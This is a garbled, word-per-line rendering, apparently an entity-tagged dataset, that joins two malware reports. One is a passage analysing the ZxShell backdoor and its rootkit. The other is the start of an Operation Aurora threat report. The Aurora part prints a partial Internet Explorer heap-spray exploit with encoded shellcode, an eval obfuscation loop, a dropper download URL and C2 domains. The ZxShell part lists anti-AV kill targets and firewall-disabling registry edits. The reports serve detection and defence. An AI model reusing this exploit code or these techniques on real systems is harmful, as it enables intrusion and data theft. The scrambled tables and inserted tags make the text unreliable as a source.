boolean
value
is
set
to
1
,
a
listening
socket
is
created
.

The
code
waits
for
an
incoming
connection
.

When
the
connection
is
established
a
new
thread
is
spawned
that
starts
with
the
MainConnectionIo
function
.

MainConnectionIo

The
MainConnectionIo
function
checks
if
the
Windows
Firewall
is
enabled
,
sets
the
Tcp
Keep
Alive
value
and
Non-blocking
mode
connection
options
and
receives
data
from
the
remote
host
through
the
ReceiveCommandData
function
.

If
the
communication
fails
,
ZxShell B_malware.backdoor
disables
the
firewall
by
modifying
the
registry
key
:
HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile

Then
the
connection
is
retried
.

The
received
command
is
then
processed
by
the
ZxShell B_malware.backdoor
function
with
the
ProcessCommand
function
.

The
command
processing
function
starts
by
substituting
the
main
module
name
and
path
in
the
hosting
process
PEB
,
with
the
one
of
the
default
internet
browser
.

The
path
of
the
main
browser
of
the
workstation
is
obtained
by
reading
the
registry
value
:
HKLM\SOFTWARE\Classes\HTTP\shell\open\command

Image
5
.
Our
test
workstation
use
Windows
Internet
Explorer
as
default
browser
.

This
trick
renders
identification
by
firewall
more
cumbersome
.

A
host
firewall
will
recognize
the
outgoing
connection
as
originated
by
the
browser
instead
of
the
ZxShell B_malware.backdoor
service
host
process
.

The
browser
process
always
performs
outgoing
connections
and
the
firewall
shouldn't
block
them
.

The
command
processing
is
straightforward
.

Here
is
the
list
of
common
commands
:
COMMAND
Help
/
?
Exit
/
Quit

SysInfo

SYNFlood

CleanEvent

MEANING

Get
help

Exit
and
shut
down
the
botnet
client

Get
target
System
information

Perform
a
SYN
attack
on
a
host

Process
service
Unix
command
implementation

Clear
System
Event
log

Find
login
account
password

Get
time
information
about
a
file

List
all
the
dial-up
accounts
and
passwords

Account
Management
System

Transfer
file
in
or
from
remote
host

Run
a
program
in
the
remote
host

Service
control
command
,
implemented
as
the
Windows
one

Clone
user
account

Create
new
process
as
another
User
or
Process
context
.

Terminal
service
configuration
(
working
on
Win
Xp/2003
)

Remote
Shell

Logout
,
shutdown
or
restart
the
target
system

Spoofing
,
redirection
,
packet
capture

Run
ZXNC
v1.1
--
a
simple
telnet
client

FindPass

FileTime

FindDialPass

User

TransFile

Execute

RunAs

TermSvc

GetCMD

Shutdown

ZXARPS  B_malware.unknown

ZXNC

ZXHttpProxy
Run
a
HTTP
proxy
server
on
the
workstation

ZXSockProxy
Run
a
Sock
4
&
5
Proxy
server

ZXHttpServer
Run
a
custom
HTTP
server

PortScan

KeyLog

LoadDll

Uninstall

ShareShell

CloseFW

FileMG
winvnc
rPortMap
capsrv
zxplug

Run
TCP
Port
MultiScanner
v1.0

Capture
or
record
the
remote
computer's
keystrokes
.

The
implementation
is
a
userland
keylogger
that
polls
the
keymap
with
each
keystroke
.

Load
a
DLL
into
the
specified
process

Terminate
ZxShell B_malware.backdoor
DLL

Uninstall
and
terminate
ZxShell B_malware.backdoor
bot
DLL

Share
a
shell
to
other

Switch
off
Windows
Firewall

File
Manager

Remote
Desktop

Port
Forwarding

Video
Device
Spying

Add
and
load
a
ZxShell B_malware.backdoor
custom
plugin

This
set
of
functionality
allows
the
operator
complete
control
of
a
system
.

Being
able
to
transfer
and
execute
files
on
the
infected
system
means
the
attacker
can
run
any
code
they
please
.

Further
,
the
keylogging
and
remote
desktop
functionality
allows
the
operator
to
spy
on
the
infected
machine
,
observing
all
keystrokes
and
viewing
all
user
actions
.

Uninstall

Unloads
ZxShell B_malware.backdoor
and
deletes
all
of
the
active
components
.

This
simply
deletes
the
ZxShell B_malware.backdoor
service
key
from
the
Windows
registry
(
using
SHDeleteKey
Api
)
and
all
of
the
subkeys
.

Finally
,
it
marks
ZxShell B_malware.backdoor
main
Dll
for
deletion
with
the
MoveFileEx
Windows
API
.

ZxFunction001

This
function
is
the
supporting
functionality
for
WinVNC
.

To
allow
the
VNC
session
to
connect
,
the
current
network
socket

WSAProtcol_Info
structure
is
written
to
a
named
pipe
prior
to
calling
zxFunction001
.

Once
the
named
pipe
has
been
created
,
CreateProcessAsUserA
is
called
with
the
following
as
the
CommandLine
parameter
:
<systemroot>\\rundll32.exe
<ZxShell B_malware.backdoor
dll
name>,zxFunction001
<name
of
NamedPipe>
zxFunction001
modifies
the
current
process
memory
,
uses
data
contained
in
the
named
pipe
to
create
a
socket
,
and
then
executes
the
code
that
sends
the
remote
desktop
session
to
the
server
controller
.

ZxFunction002

This
function
will
either
bind
the
calling
process
to
a
port
or
has
the
calling
process
connect
to
a
remote
host
.

The
function
is
called
in
the
following
manner
:
<systemroot>\\rundll32.exe
<ZxShell B_malware.backdoor
dll
name>,zxFunction002
<name
of
NamedPipe>

The
functionality
(
connect
or
bind
)
depends
on
the
data
contained
within
the
named
pipe
.

Unlike
zxFunction001
,
this
is
not
used
by
any
of
the
RAT B_malware.drop
commands
in
the
ZxShell.dll B_malware.backdoor
.

Kernel
Device
Driver
LoveUSD

Apart
from
user-mode
ZxShell B_malware.backdoor
droppers
mentioned
earlier
,
there
is
a
file
(
SHA256
:
e200d0d3de360d9c32e30d4c98f07e100f6260a86a817943a8fb06995c15335 B_hash
)
that
installs
a
kernel
device
driver
called
loveusd.sys
.

The
architecture
of
this
dropper
is
different
from
the
others
:
it
starts
extracting
the
main
driver
from
itself
.

It
adds
the
SeLoadDriver
privilege
to
its
access
token
and
proceeds
to
install
the
driver
as
a
fake
disk
filter
driver
.

ZxShell B_malware.backdoor
opens
the
registry
key
that
describes
the
disk
class
drivers
:
SYSTEM\CurrentControlSet\Control\Class\{4D36E967-E325-11CE-BFC1-08002BE10318}

It
then
adds
the
'
Loveusd.sys
'
extracted
driver
name
to
the
upper
filter
list
.

In
our
analysed
sample
the
'
Loveusd.sys
'
driver
is
installed
with
the
name
'
USBHPMS
'
.

Finally
the
driver
is
started
using
the
ZwLoadDriver
native
API
.

The
ZxShell B_malware.backdoor
driver
starts
by
acquiring
some
kernel
information
and
then
hooking
'
ObReferenceObjectByHandle
'
API
.
Finally
it
spawns
2
system
threads
.

The
first
thread
is
the
'
communication
'
thread
.
ZxShell B_malware.backdoor
employs
a
strange
method
for
communication
:
it
hooks
the
NtWriteFile
API
and
recognizes
5
different
special
handle
values
as
commands
:
0x111111111
--
Hide
'
Loveusd
'
driver
from
the
system
kernel
driver
list
.

0x22222222
--
Securely
delete
an
in-use
or
no-access
target
file-name
.

0x44444444
--
Unhook
the
ZwWriteFile
API
and
hook
KiFastCallEntry
.

0x55555555
--
Remove
the
ZxShell B_malware.backdoor
Image
Load
Notify
routine
.

0x88888888
--
Set
a
special
value
called
'
type
'
in
Windows
registry
key
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverMain
.

The
second
Loveusd
system
thread
does
a
lot
of
things
.

Its
principal
duties
are
to
create
the
ZxShell B_malware.backdoor
main
DLL
in
'
c:\Windows\System32\commhlp32.dll
'
and
to
install
the
Kernel
'
Load
Image
Notify
routine
'
.

The
code
then
tries
to
kill
each
process
and
service
that
belongs
to
the
following
list
of
AV
products
:
Symantec
Firewall

Norton

ESET

McAfee

Avast

Avira

Sophos

Malwarebytes

Next
,
the
ZxShell B_malware.backdoor
Load-Image
Notify
function
prevents
the
AV
processes
from
restarting
.

The
installation
procedure
continues
in
the
user-mode
dropper
.

The
ZxShell B_malware.backdoor
service
is
installed
as
usual
,
and
the
in-execution
dropper
is
deleted
permanently
using
the
special
handle
value
0x22222222
for
the
WriteFile
API
call
.

This
handle
value
is
invalid
:
all
the
windows
kernel
handle
values
are
by
design
a
multiple
of
4
.

The
ZxShell B_malware.backdoor
hook
code
knows
that
and
intercept
it
.

ObReferenceObjectByHandle
is
a
Kernel
routine
designed
to
validate
a
target
object
and
return
the
pointer
to
its
object
body
(
and
even
its
handle
information
)
,
starting
from
the
object
handle
(
even
the
user-mode
one
)
.

The
hook
installed
by
ZxShell B_malware.backdoor
implements
one
of
its
filtering
routine
.

It
filters
each
attempt
to
open
the
ZxShell B_malware.backdoor
protected
driver
or
the
main
DLL
,
returning
a
reference
to
the
'
netstat.exe
'
file
.

The
protection
is
enabled
to
all
processes
except
for
ones
in
the
following
list
:

Svchost.exe
,
Lsass.exe
,
Winlogon.exe
,
Services.exe
,
Csrss.exe
,
ctfmon.exe
,
Rundll32.exe
,
mpnotify.exe
,
update.exe
.

If
the
type
of
the
object
that
the
system
is
trying
to
validate
is
a
process
,
the
hook
code
rewrites
again
the
configuration
data
of
the
ZxShell B_malware.backdoor
service
in
the
windows
registry
.

Image
6
.
Our
test
Windows
XP
workstation
trying
to
open
the
sys
file
of
ZxShell B_malware.backdoor
LOVEUSD
driver
.

The
last
type
of
Kernel
modification
that
ZxShell B_malware.backdoor
rootkit
performs
is
the
system
call
dispatcher
(
KiFastCallEntry
)
hook
.

In
this
manner
,
ZxShell B_malware.backdoor
is
able
to
completely
hide
itself
,
intercepting
the
following
Kernel
API
calls
:
ZwAllocateVirtualMemory
,

ZwOpenEvent
,
ZwQueryDirectoryFile
,
ZwWriteFile
,
ZwEnumerateKey
,
and
ZwDeviceIoControlFile
.

Command
and
Control
Server

Sample
(
SHA256
:
1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c  B_hash
)
is
configured
to
act
as
a
server
.

The
symbol
'
g_bCreateListenSck
'
is
set
to
1
.

This
means
that
,
as
seen
above
,
the
ZxShell B_malware.backdoor
Dll
is
started
in
listening
mode
.

It
connects
to
the
first
remote
C&C
that
tries
to
contact
it
and
succeeds
in
the
handshake
.

The
encrypted
IP
address
is
'
127.0.0.2 B_ip.distribute
'
(
used
as
loopback
)
and
no
connection
is
made
on
that
IP
address
(
due
to
the
listening
variable
set
to
1
)
.

Malware
Package

We
used
the
ZxShell B_malware.backdoor
package
for
version
3.10
(
SHA256
:
1622460afbc8a255141256cb77af61c670ec21291df8fe0989c37852b59422b4) B_hash
.

The
convenient
thing
about
this
is
that
the
CNC
panel
worked
with
any
version
,
3.10
and
above
.

The
buttons
are
all
in
Chinese
,
with
the
help
of
Google
Translate
and
keen
detective
skills
(
read
:
button
clicking
)
,
we've
deciphered
the
functionality
.

When
you
start
the
controller
,
you
need
to
set
the
port
you
want
to
listen
on
and
if
you've
set
a
password
,
add
it
here
.

Once
an
infected
machine
connects
,
you
see
its
information
displayed
in
a
selection
box
at
the
top
.

There
are
some
built
in
functions
on
the
side
for
the
more
common
features
.

These
include
remote
desktop
,
webcam
spying
,
remote
shell
,
and
file
management
.

You
can
also
select
a
host
and
type
help
for
a
full
list
of
commands
.

I
have
the
same
machine
infected
with
two
different
version
of
ZxShell B_malware.backdoor
.

Sending
the
help
command
for
each
,
you
can
see
the
extra
features
added
between
version
3.1
and
3.2
.

Keylogging
,
ZXARPS  B_malware.unknown
(
IP
and
URL
spoofing
)
,
and
SYNFlood
are
some
of
the
interesting
features
added
to
version
3.2
.

Version
Information

We
wrote
a
script
to
extract
version
info
from
the
binaries
we
have
.

3.100
:
914
3.200
:
152
3.210
:
118
3.220
:
14
3.390
:
3

In
versions
3.1
--
3.21
,
the
configuration
info
is
xor
encoded
with
0x85
.

This
configuration
info
can
be
changed
with
a
tool
included
in
the
ZxShell B_malware.backdoor
package
.

In
versions
3.22
and
3.39
the
routine
changes
.

The
new
xor
encoding
byte
is
0x5B
.

The
data
is
stored
in
the
last
0x100
bytes
of
the
file
.

The
first
8
bytes
of
data
are
static
.

Then
there
is
the
dll
install
name
,
the
domain
,
and
the
port
.

Extracted
URL
Analysis

Knowing
the
obfuscation
routines
for
this
data
we
wrote
a
script
to
extract
the
URLs
/
IPs
and
ports
stored
.

The
most
common
ports
used
are
,
80
,
1985
,
1986
,
and
443
.

1985
is
the
default
port
for
the
malware
,
1986
is
the
lazy
variation
of
that
port
.

Port
80
and
443
are
the
default
ports
for
HTTP
and
HTTPS
traffic
.

The
next
most
common
is
port
53
.

This
is
used
in
some
of
the
newer
3.22
and
3.39
samples
.

After
that
,
the
count
for
each
port
starts
declining
sharply
.

The
choices
are
interesting
though
,
many
correspond
to
what
looks
like
the
birth
year
of
the
controller
(
ie
.
years
in
the
late
1980s
and
early
1990s
)
,
and
others
seem
to
match
what
year
the
malware
was
launched
in
(
ie
.
in
the
2000s
,
relatively
close
to
the
current
year
)
.

Since
this
malware
dates
back
to
around
2004
,
there
are
many
samples
containing
CNC
URLs
from
the
3322.org
page
.

This
page
used
to
offer
no-ip
type
hosting
and
was
widely
used
by
malware
authors
.

So
much
so
that
Microsoft
did
a
takedown
in
2012
.

A
similar
service
,
vicp.net
,
is
also
seen
in
many
of
the
domains
.

In
the
malware
,
if
a
domain
is
configured
,
it
will
retrieve
domain.tld
/
myip.txt
.

This
file
contains
a
list
of
IP
addresses
for
the
infected
machine
to
connect
back
to
.

Otherwise
,
if
an
IP
address
is
configured
,
it
will
connect
directly
to
that
IP
address
.

Cloning
the
ZxShell B_malware.backdoor
Server

We
have
written
a
simple
C++
ZxShell B_malware.backdoor
Server
that
implements
the
communication
and
the
handshake
for
the
version
3.10
and
3.20
of
the
ZxShell B_malware.backdoor
DLL
.

The
implementation
is
quite
simple
:
After
the
handshake
,
2
threads
that
deal
with
data
transfer
are
spawned
.

Here
we
have
some
screenshots
that
show
the
Server
and
the
ZxShell B_malware.backdoor
Keylogger
in
action
:

Our
server
has
accepted
a
connection
from
a
remote
host
.

The
ZxShell B_malware.backdoor
keylogger
has
captured
2
user
passwords
(
gmail.com
and
amazon.com
)
.

The
last
image
shows
a
very
interesting
feature
of
the
ZxShell B_malware.backdoor
keylogger
:
once
installed
and
activated
,
the
keylogger
is
able
to
catch
each
password
that
the
user
inserts
in
the
login
box
of
each
website
(
like
Google
,
Amazon
and
so
on
...
)
.

This
makes
the
keylogger
a
perfect
weapons
for
the
attackers
.

They
will
be
able
to
steal
and
resell
in
the
underground
market
the
sensitive
data
of
each
victim
.

Conclusion

Advanced
persistent
threats
will
remain
a
problem
for
companies
and
organizations
of
all
sizes
,
especially
those
with
high
financial
or
intellectual
property
value
.

Group
72's
involvement
in
Operation
SMN
is
another
example
of
what
sort
of
damage
that
can
be
done
if
organizations
are
not
diligent
in
their
efforts
to
secure
their
networks
.

ZxShell B_malware.backdoor
is
one
sample
amongst
several
tools
that
Group
72
used
within
their
campaign
.

ZxShell B_malware.backdoor
is
a
sophisticated
tool
employed
by
Group
72
that
contains
all
kinds
of
functionality
.

Its
detection
and
removal
can
be
difficult
due
to
the
various
techniques
used
to
conceal
its
presence
,
such
as
disabling
the
host
anti-virus
,
masking
its
installation
on
a
system
with
a
valid
service
name
,
and
by
masking
outbound
traffic
as
originating
from
a
web
browser
.

While
other
techniques
are
also
utilized
to
conceal
and
inhibit
its
removal
,
ZxShell's B_malware.backdoor
primary
functionality
is
to
act
as
a
Remote  B_malware.drop
Administration  I
Tool  I
(
RAT B_malware.drop
)
,
allowing
the
threat
actor
to
have
continuous
backdoor
access
on
to
the
compromised
machine
.

As
our
analysis
demonstrates
,
ZxShell B_malware.backdoor
is
an
effective
tool
that
can
be
ultimately
used
to
steal
user
credentials
and
other
highly
valuable
information
.

The
threat
posed
by
ZxShell B_malware.backdoor
to
organizations
is
one
that
cannot
be
ignored
.

Organizations
with
high
financial
or
intellectual
property
value
should
take
the
time
to
ensure
their
security
requirements
are
met
and
that
employee's
are
educated
about
the
security
threats
their
organizations
face
.

For
additional
information
,
please
see
our
blog
post
.

Protecting
Users
from
These
Threats

Advanced
Malware
Protection
(
AMP
)
is
ideally
suited
to
detect
the
sophisticated
malware
used
by
this
threat
actor
.

CWS
or
WSA
web
scanning
prevents
access
to
malicious
websites
,
including
watering
hole
attacks
,
and
detects
malware
used
in
these
attacks
.

The
Network
Security
protection
of
IPS
and
NGFW
have
up-to-date
signatures
to
detect
malicious
network
activity
by
threat
actors
.

ESA
can
block
spear B_malware.drop
phishing  I
emails
sent
by
threat
actors
as
part
of
their
campaign
.

Appendix
A
:
Snort
Rules

Initial
connection
from
the
infected
computer's
perspective
--
after
it
connects
to
the
controller
-

RECV
:
85190000250400000000404000000000

SEND
:
86190000040100006666464000000000

RECV
:
4edf9340780100000000000000000000

SEND
:
00000000000000000000000000000000

The
rules
are
on
the
first
8
bytes
of
the
first
two
packets
.

They
are
hard
coded
in
the
binaries
.

The
rest
of
the
bytes
are
variable
(
for
example
,
66664640
is
a
floating
point
version
number
of
ZxShell B_malware.backdoor
)
.

Snort
rules
:
sid:32180
sid:32181

These
rules
have
been
released
in
our
community
ruleset
and
can
be
downloaded
and
used
directly
,
or
via
pulledpork
from
Snort.org
.

Appendix  B_malware.backdoor
B
:
ClamAV
Signatures

Win.Trojan.ZxShell-11 B_malware.backdoor

Win.Trojan.ZxShell-12 B_malware.backdoor

Win.Trojan.ZxShell-13 B_malware.backdoor

Win.Trojan.ZxShell-14 B_malware.backdoor

Win.Trojan.ZxShell-15 B_malware.backdoor

Win.Trojan.ZxShell-16 B_malware.backdoor

Win.Trojan.ZxShell-17 B_malware.backdoor

Win.Trojan.ZxShell-18 B_malware.backdoor

Win.Trojan.ZxShell-19 B_malware.backdoor

Win.Trojan.ZxShell-20 B_malware.backdoor

Win.Trojan.ZxShell-21 B_malware.backdoor

Win.Trojan.ZxShell-22 B_malware.backdoor

Win.Trojan.ZxShell-23 B_malware.backdoor

Win.Trojan.ZxShell-24 B_malware.backdoor

Win.Trojan.ZxShell-25 B_malware.backdoor

Win.Trojan.ZxShell-26 B_malware.backdoor

These
signatures
are
available
within
the
ClamAV
database
.

Please
run
freshclam
to
ensure
you
stay
updated
with
the
latest
coverage
.

Appendix
C
:
List
of
Memory
Offsets
for
Some
ZxShell B_malware.backdoor
Functions

Here's
a
list
for
some
ZxShell B_malware.backdoor
functions
for
sample
SHA256
:
1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c  B_hash
:

BRIEF
DESCRIPTION

ZxShell B_malware.backdoor
GetProcAddress
implementation

FUNCTION
NAME

ZxGetLibAndProcAddr

CopyMemoryFromNewMsvcrt
ZxShell B_malware.backdoor
memory
copy
routine

ServiceExists

ProcessScCommand

AnalyseAndLoadPlugins

DeleteAndLogPlugin

KeyloggerThread

GetIpListAndConnect

BuildTargetIpListStruct

DoHandshake

GetLocalPcDescrStr

MainConnectionIo

ReceiveCommandData

ProcessCommand

OFFSET
0x12CDA
0x12C4C
0x0A7C7

Get
if
a
service
is
installed
in
the
system
or
not
0x0E3EF

ZxShell B_malware.backdoor
'
SC
'
command
implementation
0x0127B7

Parse
the
installed
plugin
list
and
load
each
one
of
them
0x012597

Delete
a
corrupted
plugin
and
log
the
problem

ZxShell B_malware.backdoor
keylogger
implementation
0x0D591

Analyse
the
IP
list
inside
the
ZxShell B_malware.backdoor
PE
and
tries
to
connect
0x011496

Build
remote
server
Ip
list
structure

Perform
initial
connection
handshake

Build
a
string
containing
the
target
workstation
data

ZxShell B_malware.backdoor
main
connection
I/O
routine

Receive
each
byte
from
the
socket
until
a
newline
char

Main
ZxShell B_malware.backdoor
command
processing
routine
0x11419
0xB8E8
0x0B627
0x1126C
0x016DF
0x10C2B

Appendix
D
:
Other
Collateral

Here
is
a
non-exhaustive
list
of
ZxShell B_malware.backdoor
samples
that
were
analyzed
for
this
report
.

Here
is
a
list
of
Domains
organized
by
port
.

Tags
:
APT
,
Group
72
,
malware
,
Operation
SMN
,
security
,
SMN
,
Talos
,
threats
OPERATION B_malware.infosteal
AURORA  I

February
10
,
2010

Cyber
Espionage
is
a
critical
issue
.

Over
80%
of
intellectual
property
is
stored
online
digitally
.

The
computing
infrastructure
in
a
typical
Enterprise
is
more
vulnerable
to
attack
than
ever
before
.

Current
security
solutions
are
proving
ineffective
at
stopping
cyber
espionage
.

Malware
is
the
single
greatest
problem
in
computer
security
today
.

Yet
,
malware
represents
only
the
tip
of
the
spear
.

The
true
threat
is
the
human
being
who
is
operating
the
malware
.

This
human
and
the
organization
represented
is
the
true
threat
that
is
targeting
information
for
the
purposes
of
financial
gain
,
theft
of
state
secrets
,
and
theft
of
intellectual
property
.

True
threat
intelligence
requires
reaching
beyond
malware
infections
to
identify
the
individuals
,
country
of
origin
,
and
intent
of
the
attacker
.

2
HB
GARY
THREAT
REPORT
:
OPERATION B_malware.infosteal
AURORA  I

THREAT
SUMMARY

The
Aurora  B_malware.infosteal
malware
operation
was
identified
recently
and
made
public
by
Google
and
McAfee
.

This
malware
operation
has
been
associated
with
intellectual
property
theft
including
source
code
and
technical
diagrams
(
CAD
,
oil
exploration
bid-data
,
etc
)
.

Companies
hit
have
been
publically
speculated
,
including
Google
,
Adobe
,
Yahoo
,
Symantec
,
Juniper
Networks
,
Rackspace
,

Northrop
Grumman
,
and
Dow
Chemical
.

The
malware
package
used
with
Aurora  B_malware.infosteal
is
mature
and
been
in
development
since
at
least
2006
.

The
Aurora  B_malware.infosteal
operation I
is
characterized
by
a
remotely
operated
backdoor
program
that
persists
on
a
Windows
computer
.

This
backdoor
program
has
several
capabilities
that
are
outlined
below
.

KEY
FINDINGS

Evidence
collected
around
the
malware
operation
suggest
that
Operation B_malware.infosteal
Aurora  I
is
simply
an
example
of
highly
effective
malware
penetration
.

There
is
not
significant
evidence
to
attribute
the
operation
directly
to
the
Chinese
Government
.

However
,
key
actors
have
been
identified
in
association
with
malware
operations
that
utilize
Chinese
systems
and
native
language
malware
.

This
has
lead
to
a
great
deal
of
speculation
about
Chinese-State
involvement
.

It
must
be
noted
that
a
large
and
thriving
underground
economy
exists
to
both
build
and
disseminate
malware
worldwide
,
and
that
most
of
this
malware
is
capable
of
intellectual
property
theft
.

The
malicious
hacking
underculture
is
strong
in
China
,
as
in
Eastern
Europe
and
elsewhere
,
and
clearly
enmeshed
into
a
global
criminal
economy
of
data
theft
.

While
diffi
cult
to
conclude
that
these
activities
receive
any
form
of
state
sponsorship
or
direction
,
the
malware
operation
remains
a
funded
and
significant
risk
to
intellectual
property
in
the
enterprise
.

ASPECT

DESCRIPTION

Target

Origin

Developers

The
operation
is
targeting
intellectual
property
with
no
specific
industry
focus
.

This
is
an
example
of
'
not
knowing
what
they
are
looking
for
until
they
find
it
'
.

It
is
highly
probable
that
the
malware
was
developed
in
native
Chinese
language
,
and
the
operation
control
system
is
designed
for
Chinese
users
,
indicating
the
entire
operation
is
Chinese
.

This
does
not
,
however
,
mean
the
Chinese
Government
is
using
the
system
.

Forensic
tool-marks
in
the
CRC
algorithm
can
betraced
to
Chinese
origin
.

That
,
combined
with
domain
registration
information
,
leads
to
at
least
one
potential
actor
,
Peng
Yongii
.

The
malware
has
been
in
development
since
at
least
2006
.

It
has
been
updated
several
times
.

ASPECT

DESCRIPTION

Operators

Intent

Coms

Operators
of
the
malware
appear
to
use
certain
domains
for
C&C
control
.

Dynamic
DNS
is
a
key
feature
of
the
operation
,
with
many
known
C&C
servers
operating
from
domains
registered
through
Peng
Yong's
3322.org
service
.

The
primary
intent
is
the
theft
of
intellectual
property
.

Communication
is
encrypted
over
HTTP
,
port
443
,
obfuscated
with
a
weak
encryption
scheme
.

The
C&C
servers
tend
to
operate
from
domains
hosted
on
dynamic
DNS
.

ATTRIBUTION

At
this
time
,
there
is
very
little
available
in
terms
of
attribution
.

A
CRC
algorithm
tends
to
indicate
the
malware
package
is
of
Chinese
origin
,
and
many
attacks
are
sourced
out
of
a
service
called
3322.org
—
a
small
company
operating
out
of
Changzhou
.

The
owner
is
Peng
Yong
,
a
Mandarin
speaker
who
may
have
some
programming
background
with
such
algorithms
.

His
dynamic
DNS
service
hosts
over
1
million
domain
names
.

Over
the
last
year
,
HBGary
has
analyzed
thousands
of
distinct
malware
samples
that
communicate
with
3322.org
.

While
Peng
Yong
is
clearly
tolerant
of
cyber
crime
operating
through
his
domain
services
,
this
does
not
indicate
he
has
any
direct
involvement
with
Aurora  B_malware.infosteal
.

TOOLMARK

DESCRIPTION

Embedded
Resource
Language
Code

United
States

CRC
Algorithm
Table
of
Constants

Embedded
systems
/
Chinese
publication

DNS
registration
services

Peng
Yong
,
others

DETECT

This
section
of
the
report
details
how
you
can
detect
Operation B_malware.infosteal
Aurora  I
in
your
Enterprise
.

The
exploit
and
payload
vehicle
consists
of
the
following
components
:

•
JavaScript
based
exploit
vector
,
known
to
exploit
IE
6

•
Shellcode
component
,
embedded
in
the
JavaScript

•
Secondary
payload
server
that
delivers
a
dropper

•
The
dropper
itself
,
which
only
used
once
and
then
deleted

•
The
backdoor
program
which
is
decompressed
from
the
dropper

February
10
,
2010
3

JAVASCRIPT
AND
SHELLCODE

The
JavaScript
based
attack
vector
associated
with
Operation B_malware.infosteal
Aurora  I
was
published
in
the
public
domain
in
early
January
2010
.

Microsoft
details
the
vulnerability
in
Security
Bulletin
MS10-002
.

Internet
Explorer
5.01
,
Internet
Explorer
6
,
Internet
Explorer
6
Service
Pack
1
,
Internet
Explorer
7
,
and
Internet
Explorer
8
(
except
Internet
Explorer
6
for
supported
editions
of
Windows
Server
2003
)
are
affected
.

Exploit
code
analyzed
by
HBGary
reveals
that
only
Internet
Explorer
6
was
targeted
during
Operation B_malware.infosteal
Aurora  I
.

This
vulnerability
can
be
leveraged
by
attackers
of
varying
skill
levels
due
to
the
public
availability
of
the
Metasploit
module
'
ie_aurora.rb
'
.


JAVASCRIPT
EXPLOIT
CODE
<html>
<head>
<script>
var
sc
=
unescape('%u9090%u19eb%u4b5b%u3390%u90c9%u7b80%ue901%u0175%u66c3%u7bb9%u8004%u0b34%ue2d8%uebfa%ue805%uffe2%uffff%u3931%ud8
db%u87d8%u79bc%ud8e8%ud8d8%u9853%u53d4%uc4a8%u5375%ud0b0%u2f53%ud7b2%u3081%udb59%ud8d8%u3a48%ub020%ueaeb%ud8d8%u8db0%ubdab%u
8caa%u9e53%u30d4%uda37%ud8d8%u3053%ud9b2%u308

SECTION
REMOVED
FOR
SPACE
...
8%udfa7%ufa4a%uc6a8%ubc7c%u4b37%u3cea%u564c%ud2cb%ua174%u3ee1%u1c40%uc755%u8fac%ud5be%u9b27%u7466%u4003%uc8d2%u5820%u770e%u2342
%ucd8b%ub0be%uacac%ue2a8%uf7f7%ubdbc%ub7b5%uf6e9%uacbe%ub9a8%ubbbb%uabbd%uf6ab%ubbbb%ubcf7%ub5bd%uf7b7%ubcb9%ub2f6%ubfa8%u00d8');
var
sss
=
Array
(
826
,
679
,
798
,
224
,
770
,
427
,
819
,
770
,
707
,
805
,
693
,
679
,
784
,
707
,
280
,
238
,
259
,
819
,
336
,
693
,
336
,
700
,
259
,
819
,
336
,
693
,
336
,
700
,
238
,
287
,
413
,
224
,
833
,

SECTION
REMOVED
FOR
SPACE
...
735
,
427
,
336
,
413
,
735
,
420
,
350
,
336
,
336
,
413
,
735
,
301
,
301
,
287
,
224
,
861
,
840
,
637
,
735
,
651
,
427
,
770
,
301
,
805
,
693
,
413
,
875);
var
arr
=
new
Array;
for
(
var
i
=
0;
i
<
sss.length;
i
++
)
{
arr[i]
=
String.fromCharCode
(
sss
[i]
/
7);
var
cc
=
arr.toString
(
);
cc
=
cc.replace
(
/,/g
,
'
'
);
cc
=
cc.replace
(
/@/g
,
'
,');
eval
(
cc);
var
x1
=
new
Array
(
);
for
(
i
=
0;
i
<
200;
i
++
)
{
x1
[i]
=
document.createElement
(
'
COMMENT');
x1
[i].data
=
'
abc';
var
e1
=
null;
function
ev1
(
evt
)
e1
=
document.createEventObject
(
evt);
document.getElementById
(
'
sp1').innerHTML
=
'
'
;
window.setInterval
(
ev2
,
50);
'
\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u
0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0
d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d';
x1
[i].data
=
p;
for
(
i
=
0;
i
<
x1.length;
i
++
)
{
var
t
=
e1.srcElement;
function
ev2
(
)
</script>
</head>
<body>
<span
id='sp1'><IMG
SRC='aaa.gif
'
onload='ev1(event
)
'
width='16
'
height='16'></span>
</body>
</html>

4
HB
GARY
THREAT
REPORT
:
OPERATION B_malware.infosteal
AURORA  I

The
exploit
code
used
by
the
original
attackers
was
quickly
improved
and
added
to
Metasploit
thus
greatly
expanding
the
potential
number
of
attackers
and
reliability
of
code
.

The
JavaScript
performs
a
heap
spray
attack
and
injects
the
embedded
shellcode
described
below
.

The
JavaScript
exploits
the
vulnerability
in
Internet
Explorer
by
copying
,
releasing
,
and
then
referencing
a
Document
Object
Model
(
DOM
)
element
.

JAVASCRIPT
ARTIFACTS

PATTERN

Initial
encrypted
dropper
download
.

Deleted
file
.

C:\%appdata%\a.exe

Decrypted
dropper
.
Deleted
file
.

C:\%appdata\b.exe

JavaScript
present
in
Internet
Explorer
memory
space
.
<code
listed
above>

Download
URL
present
in
internet
history
during
memory
analysis
.
http://demo1.ftpaccess.cc/demo/ad.jpg B_url.unknown

Other
domains
associated
with
Aurora  B_malware.infosteal
.

sl1.homelinux.org B_url.distribute
360.homeunix.com  B_url.distribute
ftp2.homeunix.com B_url.distribute
update.ourhobby.com B_url.distribute
blog1.servebeer.com B_url.distribute

The
shellcode
exists
as
a
Unicode
escaped
variable
(
sc
)
in
the
malicious
JavaScript
listed
below
.

Upon
successful
exploitation
of
Internet
Explorer
,
the
shellcode
will
download
an
obfuscated
second
stage
executable
from
http://demo1.ftpaccess.cc/demo/ad.jpg B_url.unknown
which
is
the
dropper
.

Note
:
these
files
are
specific
to
the
sample
we
analyzed
at
HBGary
,
Inc
.

The
attackers
must
use
a
second
stage
download
mechanism
to
achieve
full
system
